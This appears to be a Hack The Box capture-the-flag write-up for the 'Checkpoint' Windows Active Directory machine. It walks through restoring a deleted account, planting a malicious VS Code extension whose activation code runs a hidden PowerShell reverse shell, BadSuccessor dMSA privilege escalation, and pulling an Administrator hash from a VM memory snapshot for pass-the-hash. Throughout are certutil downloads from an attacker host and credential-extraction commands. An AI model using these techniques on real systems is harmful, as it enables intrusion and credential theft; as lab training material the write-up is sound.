---
title: Checkpoint - Hack The Box Writeup
date: 2026-06-15
categories: [CTF, Writeups, HTB]
tags: [htb, windows, medium, active-directory, dmsa, badsuccessor, kerberos, vscode-rce, memory-forensics, privilege-escalation]
image:
  path: "https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a1e5130b-96c5-4d6b-a7c3-aaa82554d1b2-1780052391.png"
  description: A walkthrough of the Checkpoint HTB machine, chaining a malicious VS Code extension RCE, the BadSuccessor dMSA privilege-escalation technique, and VM memory-snapshot credential extraction to full domain compromise.
author: daemonyrax
---

Checkpoint models a Windows Server 2025 Active Directory environment built around a chain of three distinct issues: a malicious VS Code extension for initial code execution, the **BadSuccessor** dMSA privilege-escalation technique to inherit a service account's group membership, and credential extraction from a VM memory snapshot to recover the Administrator hash. HTB supplies a starting set of credentials — `alex.turner` — which is enough to pull the whole chain together.

## Nmap Recon and Initial Enumeration

We start with a full port scan:

```bash
nmap -p- --min-rate 5000 -T4 [TARGET_IP] | grep open
```

The box lights up as a Domain Controller: DNS (53), Kerberos (88), RPC (135), NetBIOS (139), LDAP (389), SMB (445), Kerberos password change (464), LDAPS (636), and the Global Catalog on 3268/3269, plus WinRM on 5985.

We validate the credentials HTB provided:

```bash
nxc smb [TARGET_IP] -u alex.turner -p 'Checkpoint2024!'
```

```
SMB         [TARGET_IP]    445    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024!
```

A share listing as `alex.turner` turns up the usual `SYSVOL`/`NETLOGON`, plus two more interesting ones: `DevDrop`, readable and holding VS Code extensions, and `VMBackups`, which we can see but not yet access.

```bash
nxc smb [TARGET_IP] -u alex.turner -p 'Checkpoint2024!' --shares
```

## Exploring the Domain — Deleted Object Recovery

Enumerating what `alex.turner` can actually write to turns up something unusual:

```bash
bloodyad --host [TARGET_IP] -d checkpoint.htb \
  -u alex.turner -p 'Checkpoint2024!' get writable
```

`alex.turner` has WRITE access to the domain's `Deleted Objects` container — meaning we can restore a deleted account. Listing deleted users shows one candidate:

```bash
bloodyad --host [TARGET_IP] -d checkpoint.htb \
  -u alex.turner -p 'Checkpoint2024!' get search \
  --filter '(isDeleted=TRUE)' --attr name,whenDeleted
```

```
name: Mark Davies
whenDeleted: 2026-05-28T14:32:00+00:00
```

We restore it:

```bash
bloodyad --host [TARGET_IP] -d checkpoint.htb \
  -u alex.turner -p 'Checkpoint2024!' set restore \
  'CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb'
```

The restored account keeps its original password, `Checkpoint2024!`, which we confirm with `nxc smb`. Checking its share access is the payoff: unlike `alex.turner`, `mark.davies` has **READ and WRITE** on `DevDrop` — exactly what's needed to plant a malicious VS Code extension.

## Identifying Vulnerabilities

### 1. Malicious VS Code Extension RCE (CVE-2025-55319)

A flaw in VS Code's Agentic AI implementation lets a crafted extension trigger command execution once it's installed — no interaction beyond having it present is required in this scenario. Since `DevDrop` auto-syncs extensions to developer workstations, dropping a malicious `.vsix` there is enough to get code execution the moment a developer (`ryan.brooks`) opens VS Code.

### 2. BadSuccessor dMSA Privilege Escalation (CVE-2025-53779)

Windows Server 2025 introduced delegated Managed Service Accounts (dMSAs). BadSuccessor abuses the fact that anyone with `CreateChild` on an OU can create a dMSA and link it to an existing privileged account via `msDS-ManagedAccountPrecededByLink`. The KDC treats the new dMSA as a legitimate successor and lets it inherit the target account's group memberships — effectively privilege escalation through account creation rather than credential theft. The technique was disclosed by Akamai, with a public PoC at [ibaiC/BadSuccessor](https://github.com/ibaiC/BadSuccessor).

### 3. Credentials in VM Memory Snapshots

The `BackupAccess` group has access to a `VMBackups` share containing `.vmem`/`.vmsn` snapshot files from a hypervisor. Memory snapshots routinely contain credential material in plaintext or LSASS-equivalent structures, which a memory-forensics tool can parse out directly — no need to touch the live system at all.

## Exploitation

### Initial Foothold via a Malicious VSIX

We build a minimal extension package:

```
evil-ext/
├── [Content_Types].xml
└── extension/
    ├── package.json
    └── extension.js
```

`extension.js` shells out to PowerShell on activation, running a base64-encoded reverse shell payload:

```javascript
const cp = require('child_process');

exports.activate = function() {
    const payload = 'YOUR_BASE64_ENCODED_PAYLOAD_HERE';
    cp.exec(`powershell -WindowStyle Hidden -NoProfile -e ${payload}`,
            (error, stdout, stderr) => {
        if (error) console.error(error);
    });
};

exports.deactivate = function() {};
```

The payload itself is a standard TCP reverse shell built with `System.Net.Sockets.TCPClient`, base64-encoded for the `-e` PowerShell flag. We package it as a `.vsix` and upload it to `DevDrop` as `mark.davies`:

```bash
smbclient //[TARGET_IP]/DevDrop \
  -U 'checkpoint.htb/mark.davies%Checkpoint2024!' \
  -c "put devtools-helper.vsix"
```

With a listener running (`rlwrap nc -lvnp 4443`), the extension installs automatically when `ryan.brooks` next opens VS Code, and a shell calls back:

```
PS C:\Program Files\Microsoft VS Code> whoami
checkpoint\ryan.brooks
```

Initial foothold obtained as `ryan.brooks`.

### Privilege Escalation via BadSuccessor

From `ryan.brooks`, we pull down a BadSuccessor binary and check which OUs we can write to:

```powershell
certutil -urlcache -f http://[ATTACKER_IP]:8000/BadSuccessor.exe BadSuccessor.exe
.\BadSuccessor.exe find
```

```
[*] OUs you have write access to:
    -> OU=DMSAHolder,DC=checkpoint,DC=htb
       Privileges: GenericWrite, GenericAll, CreateChild
```

`ryan.brooks` can create children under `DMSAHolder`. We create a dMSA and link it to `svc_deploy`, a service account we've identified as a member of `BackupAccess`:

```powershell
.\BadSuccessor.exe escalate `
  -targetOU "OU=DMSAHolder,DC=checkpoint,DC=htb" `
  -dmsa ryandmsa `
  -targetUser "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb" `
  -dnshostname ryandmsa.checkpoint.htb `
  -user ryan.brooks `
  -dc-ip [TARGET_IP]
```

The dMSA is created, linked via `msDS-ManagedAccountPrecededByLink`, and `ryan.brooks` is added as an allowed retriever of its managed password. We request a TGT for it with Rubeus:

```powershell
Invoke-Rubeus -Command "asktgt /user:ryandmsa$ /domain:checkpoint.htb /dc:[TARGET_IP] /getcredentials /nowrap"
```

Checking `ryandmsa$`'s group membership confirms the technique worked — it has inherited `svc_deploy`'s membership in `BackupAccess`.

### Credential Extraction from a VM Memory Snapshot

Authenticating as `ryandmsa$` and confirming `BackupAccess` membership, we browse the backup share:

```powershell
dir "\\dc01.checkpoint.htb\VMBackups\NightlyBackup_2026-06-15"
```

Inside is a memory-forensics folder holding a hypervisor snapshot pair (`.vmem`/`.vmsn`). We pull down VMkatz — a tool built specifically for parsing credentials out of VM memory snapshots — and point it at the `.vmsn` file:

```powershell
certutil -urlcache -f http://[ATTACKER_IP]:8000/vmkatz.exe vmkatz.exe
.\vmkatz.exe "\\dc01.checkpoint.htb\VMBackups\NightlyBackup_2026-06-15\memory forensics\Windows Server 2019-Snapshot1.vmsn" --format ntlm
```

```
WIN-0DG6SJAEUTA\Administrator:::f29e9c014295b9b32139b09a2790be3b:::
```

Since `BackupAccess` effectively grants `SeBackupPrivilege`, the same result is reachable faster via a direct registry hive dump and `secretsdump.py` against `SYSTEM`/`SAM` hives, without touching the memory snapshot at all — worth trying first in a real assessment.

## Domain Compromise & Flags

With the Administrator NTLM hash in hand, Pass-the-Hash gets us in directly:

```bash
evil-winrm -i [TARGET_IP] -u Administrator -H 'f29e9c014295b9b32139b09a2790be3b'
```

Group membership confirms full Domain and Enterprise Admin rights. From here, both flags are just a `type` away — `ryan.brooks`'s desktop for the user flag, `Administrator`'s desktop for root.

**User flag captured.**
**Root flag captured.**

---

This concludes the walkthrough for the Checkpoint HTB machine. We restored a deleted AD object to reach a writable file share, used it to plant a malicious VS Code extension for initial code execution, abused the BadSuccessor dMSA technique to inherit a service account's backup privileges, and pulled the Administrator's NTLM hash straight out of a VM memory snapshot to take the domain. Happy hacking!
